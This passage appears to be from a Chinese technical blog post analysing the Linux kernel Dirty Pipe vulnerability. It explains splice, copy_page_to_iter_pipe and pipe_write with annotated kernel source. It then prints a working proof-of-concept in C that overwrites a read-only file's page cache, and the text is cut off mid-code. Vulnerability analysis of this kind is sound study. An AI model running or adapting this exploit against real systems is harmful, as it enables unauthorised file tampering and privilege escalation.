指向原来那个页的内存缓存页，这样就少了 copy 那一步）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">splice</span><span class=\"params\">(<span class=\"type\">int</span> fd_in, <span class=\"type\">loff_t</span> *off_in, <span class=\"type\">int</span> fd_out,</span></span><br><span class=\"line\"><span class=\"params\">               <span class=\"type\">loff_t</span> *off_out, <span class=\"type\">size_t</span> len, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>If fd_in refers to a pipe, then off_in must be NULL</li>\n<li>If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropriately.</li>\n</ul>\n<p>splice 最终会调用 <code>copy_page_to_iter_pipe</code>  函数<br>\n而这个函数并没有清除 <code>PIPE_BUF_FLAG_CAN_MERGE</code>  位<br>\n iov_iter 携带了我们写入的那个管道 而这个管道的头部 buf 被指向了我们送入的第一个参数 page，这个 page 是内存缓存页的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">size_t</span> <span class=\"title function_\">copy_page_to_iter_pipe</span><span class=\"params\">(<span class=\"keyword\">struct</span> page *page, <span class=\"type\">size_t</span> offset, <span class=\"type\">size_t</span> bytes,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"keyword\">struct</span> iov_iter *i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> i-&gt;pipe;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_tail = pipe-&gt;tail;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> i_head = i-&gt;head;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> off;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* 重点 buf的ops指向了文件缓存页 */</span></span><br><span class=\"line\">\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class=\"line\">\tget_page(page);</span><br><span class=\"line\">\tbuf-&gt;page = page;<span class=\"comment\">/* 直接指向了文件缓存页 */</span></span><br><span class=\"line\">\tbuf-&gt;offset = offset;</span><br><span class=\"line\">\tbuf-&gt;len = bytes;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;head = i_head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\ti-&gt;iov_offset = offset + bytes;</span><br><span class=\"line\">\ti-&gt;head = i_head;</span><br><span class=\"line\">out:</span><br><span class=\"line\">\ti-&gt;count -= bytes;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"pipe_write分析\"><a class=\"markdownIt-Anchor\" href=\"#pipe_write分析\">#</a> pipe_write 分析</h4>\n<p>利用的点是 pipe 被初始化申请会默认设置 flag 为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\"><span class=\"title function_\">pipe_write</span><span class=\"params\">(<span class=\"keyword\">struct</span> kiocb *iocb, <span class=\"keyword\">struct</span> iov_iter *from)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> *<span class=\"title\">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> filp-&gt;private_data;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> total_len = iov_iter_count(from);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> chars;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> was_empty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> wake_next_writer = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\thead = pipe-&gt;head; <span class=\"comment\">// 获取头结点 head是int类型 </span></span><br><span class=\"line\">\t<span class=\"comment\">// pipe是循环链表结构 如果head == tail 代表空了</span></span><br><span class=\"line\">\twas_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class=\"line\">\t<span class=\"comment\">// chars就是数据长度</span></span><br><span class=\"line\">\tchars = total_len &amp; (PAGE_SIZE<span class=\"number\">-1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* 如果有长度且管道不为空 */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">// buf指向管道的缓冲区</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class=\"number\">1</span>) &amp; mask];</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/* ☆ 此处重点 ☆</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t如果flags标志位为 PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t并且当前buf已经写过的offset加上即将写的chars的大小小于PSIZE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t就会继续写</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class=\"line\">\t\t    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class=\"line\">\t\t   <span class=\"comment\">// 验证数据存在 和IO阻塞相关 返回0代表正常</span></span><br><span class=\"line\">\t\t\tret = pipe_buf_confirm(pipe, buf);</span><br><span class=\"line\">\t\t\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 此函数就是往管道的buf所在的页写数据了 如果写了之后会直接go out 不会走下面的for(;;)</span></span><br><span class=\"line\">\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class=\"line\">\t\t\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tbuf-&gt;len += ret;</span><br><span class=\"line\">\t\t\t(···)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 上一页不能接着写的情况 就是本应该走的正常情况</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> copied;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 重新申请一个page</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!page) &#123;</span><br><span class=\"line\">\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\t(···)</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\tpipe-&gt;tmp_page = page;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tpipe-&gt;head = head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* Insert it into the buffer array */</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* 重点 初始化阶段 */</span></span><br><span class=\"line\">\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\tbuf-&gt;page = page;</span><br><span class=\"line\">\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class=\"line\">\t\t\tbuf-&gt;offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\tbuf-&gt;len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (is_packetized(filp))</span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span><span class=\"comment\">// ☆ 默认设置flag为 PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class=\"line\">\t\t\tpipe-&gt;tmp_page = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tcopied = copy_page_from_iter(page, <span class=\"number\">0</span>, PAGE_SIZE, from);</span><br><span class=\"line\">\t\t\t(···)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"poc分析\"><a class=\"markdownIt-Anchor\" href=\"#poc分析\">#</a> POC 分析</h3>\n<ul>\n<li>作者首先填满了 16 个 PIPE，将 flag 都默认设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code></li>\n<li>然后读取 清空 pipe</li>\n<li>用 open 打开对应文件，只读即可 这样就将文件放到缓存页里了</li>\n<li>splice 系统调用将对应的管道的 buf 和文件缓存页绑定在一起</li>\n<li>利用 splice 不初始化 <code>PIPE_BUF_FLAG_CAN_MERGE</code>  的特性 继续往管道里写入 就写入到了对应的文件缓存区了<br>\n这就造成了一个任意文件写的漏洞</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/user.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> PAGE_SIZE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 4096</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class=\"line\"><span class=\"comment\"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">prepare_pipe</span><span class=\"params\">(<span class=\"type\">int</span> p[<span class=\"number\">2</span>])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe(p)) <span class=\"built_in\">abort</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">unsigned</span> pipe_size = fcntl(p[<span class=\"number\">1</span>], F_GETPIPE_SZ);</span><br><span class=\"line\">\t<span class=\"type\">static</span> <span class=\"type\">char</span> buffer[<span class=\"number\">4096</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class=\"line\"><span class=\"comment\">\t   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\twrite(p[<span class=\"number\">1</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class=\"line\"><span class=\"comment\">\t   leaving the flags initialized) */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\tread(p[<span class=\"number\">0</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class=\"line\"><span class=\"comment\">\t   will be mergeable */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (argc != <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Usage: %s TARGETFILE OFFSET DATA\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* dumb command-line argument parser */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> path = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> offset = strtoul(argv[<span class=\"number\">2</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> data = argv[<span class=\"number\">3</span>];</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">size_t</span> data_size = <span class=\"built_in\">strlen</span>(data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset % PAGE_SIZE == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot start writing at a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class=\"number\">1</span>)) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> end_offset = offset + (<span class=\"type\">loff_t</span>)data_size;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; next_page) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot write across a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* open the input file and validate the specified offset */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">int</span> fd = open(path, O_RDONLY); <span class=\"comment\">// yes, read-only! :-)</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;open failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">st</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;stat failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Offset is not inside the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot enlarge the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* create the pipe with all flags initialized with</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> p[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tprepare_pipe(p);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* splice one byte from before the specified offset into the</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe; this will add a reference to the page cache, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class=\"line\"><span class=\"comment\">\t   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class=\"line\">\t--offset;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class=\"number\">1</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;splice failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes == <span class=\"number\">0</span>) &#123;</span><br><span 